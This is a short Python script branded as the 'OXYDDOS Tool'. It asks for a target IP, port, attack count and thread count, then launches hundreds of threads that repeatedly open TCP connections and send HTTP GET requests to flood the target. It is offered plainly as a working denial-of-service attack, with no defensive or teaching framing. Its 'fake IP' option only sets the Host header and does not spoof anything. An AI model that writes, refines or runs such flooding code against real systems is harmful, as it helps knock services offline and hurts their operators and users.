import socket
import threading
import os

# ASCII Art Logo
def print_logo():
    print(r"""
    DDDD    DDDDD    OOO   SSSSS   Y   Y
    D   D   D    D  O   O  S        Y Y
    D   D   D    D  O   O  SSSSS     Y
    D   D   D    D  O   O     S      Y
    DDDD    DDDDD    OOO   SSSSS     Y
    -------------------------------------------------
                     OXYDDOS Tool
    -------------------------------------------------
    """)
    
# Function to collect user input for attack parameters
def get_user_input():
    target_ip = input("Enter target IP address: ")
    fake_ip = input("Enter fake IP address (or press Enter to use default): ") or '182.21.20.32'
    port = int(input("Enter target port (default 80): ") or 80)
    attack_limit = int(input("Enter the number of attacks to send: ") or 200000)
    thread_count = int(input("Enter the number of threads (default 500): ") or 500)

    return target_ip, fake_ip, port, attack_limit, thread_count

# Attack function (same as before)
def attack(target, fake_ip, port, attack_limit):
    global attack_num
    while True:
        with lock:
            if attack_num >= attack_limit:
                break

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))

            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            with lock:
                attack_num += 1
                print(f"Attack number: {attack_num}")

            s.close()

        except socket.error as e:
            print(f"Socket error occurred: {e}")
            s.close()

# Main function to run the tool
def main():
    global attack_num
    attack_num = 0
    
    # Print logo
    print_logo()

    # Get user input
    target, fake_ip, port, attack_limit, thread_count = get_user_input()

    # Threading and launching attack
    print(f"\nStarting attack on {target}:{port} with {thread_count} threads.")
    threads = []

    for i in range(thread_count):
        thread = threading.Thread(target=attack, args=(target, fake_ip, port, attack_limit))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(f"Attack finished. Total attacks: {attack_num}")

if __name__ == "__main__":
    try:
        lock = threading.Lock()  # Initialize the lock for thread safety
        main()  # Run the tool
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        os._exit(0)
